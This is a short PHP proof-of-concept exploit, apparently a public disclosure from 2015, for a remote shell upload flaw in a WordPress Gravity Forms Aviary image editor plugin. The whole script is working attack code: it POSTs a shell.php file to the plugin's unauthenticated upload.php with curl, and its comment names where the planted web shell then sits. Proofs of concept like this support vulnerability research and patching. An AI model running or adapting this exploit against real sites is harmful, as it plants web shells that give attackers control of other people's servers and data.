    <?php
    /*Remote shell upload exploit for 
aviary-image-editor-add-on-for-gravity-forms v3.0beta */
    /*Larry W. Cashdollar @_larry0
    6/7/2015
    shell will be located 
http://www.vapidlabs.com/wp-content/uploads/gform_aviary/_shell.php
    */
     
     
    $target_url = 
'http://www.vapidlabs.com/wp-content/plugins/aviary-image-editor-add-on-for-gravity-forms/includes/
    upload.php';
    $file_name_with_full_path = '/var/www/shell.php';
     
    echo "POST to $target_url $file_name_with_full_path";
    $post = array('name' => 
'shell.php','gf_aviary_file'=>'@'.$file_name_with_full_path);
     
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$target_url);
    curl_setopt($ch, CURLOPT_POST,1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    $result=curl_exec ($ch);
    curl_close ($ch);
    echo "<hr>";
    echo $result;
    echo "<hr>";
    ?>
